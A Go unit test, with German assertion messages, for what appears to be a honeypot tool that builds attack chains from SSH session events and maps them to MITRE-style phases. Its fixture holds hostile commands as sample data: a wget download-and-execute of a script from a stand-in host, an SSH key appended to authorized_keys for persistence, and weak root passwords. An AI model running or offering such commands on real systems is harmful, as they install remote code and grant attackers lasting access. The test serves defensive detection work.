package main

import (
	"strings"
	"testing"
	"time"
)

func TestBuildChain(t *testing.T) {
	t0 := time.Unix(1700000000, 0)
	var evs []*Event
	add := func(typ string, data map[string]any, mod func(*Event)) {
		e := evAt(t0.Add(time.Duration(len(evs))*time.Second), typ, "ssh", "203.0.113.20", 22, data)
		e.Session = "s1"
		if mod != nil {
			mod(e)
		}
		evs = append(evs, e)
	}
	add("connect", nil, nil)
	add("login", nil, func(e *Event) { e.Username, e.Password = "root", "123456" })
	add("login", map[string]any{"success": true}, func(e *Event) { e.Username, e.Password = "root", "toor" })
	add("command", map[string]any{"input": "uname -a"}, nil)
	add("command", map[string]any{"input": "cd /tmp; wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh"}, nil)
	add("command", map[string]any{"input": "echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys"}, nil)
	add("download", map[string]any{"url": "http://198.51.100.9/x.sh", "sha256": strings.Repeat("c", 64)}, nil)
	c := BuildChain(evs, false)
	byID := map[string]*ChainNode{}
	for _, n := range c.Nodes {
		byID[n.ID] = n
	}
	want := map[string]int{"svc:ssh:22": phRecon, "login:ssh": phAccess, "loginok:ssh:root / toor": phAccess, "pat:recon": phExec,
		"pat:download_exec": phIngress, "pat:persist_ssh": phPersist, "host:198.51.100.9": phIngress, "file:" + strings.Repeat("c", 64): phIngress}
	for id, ph := range want {
		n := byID[id]
		if n == nil || n.Phase != ph {
			t.Errorf("Knoten %s: %+v", id, n)
		}
	}
	edges := map[string]string{}
	for _, e := range c.Edges {
		edges[e.From+" → "+e.To] = e.Label
	}
	for _, e := range []string{"svc:ssh:22 → login:ssh", "login:ssh → loginok:ssh:root / toor", "loginok:ssh:root / toor → pat:recon",
		"pat:recon → pat:download_exec", "pat:download_exec → host:198.51.100.9", "host:198.51.100.9 → file:" + strings.Repeat("c", 64)} {
		if _, ok := edges[e]; !ok {
			t.Errorf("Kante fehlt: %s (vorhanden: %v)", e, edges)
		}
	}
	if edges["pat:download_exec → host:198.51.100.9"] != "lädt von" || c.Sessions != 1 {
		t.Errorf("Beschriftung %q, Sitzungen %d", edges["pat:download_exec → host:198.51.100.9"], c.Sessions)
	}
	if len(byID["pat:download_exec"].Mitre) == 0 {
		t.Error("MITRE fehlt")
	}
	// viele verschiedene Knoten: begrenzt, ohne Absturz
	var many []*Event
	for i := 0; i < 200; i++ {
		e := evAt(t0, "download", "ssh", "203.0.113.20", 22, map[string]any{"url": "http://h" + strings.Repeat("x", i%50) + ".example/" + string(rune('a'+i%26))})
		many = append(many, e)
	}
	if c := BuildChain(many, false); len(c.Nodes) > chainMaxNodes+len(chainPhases) {
		t.Fatalf("%d Knoten", len(c.Nodes))
	}
}
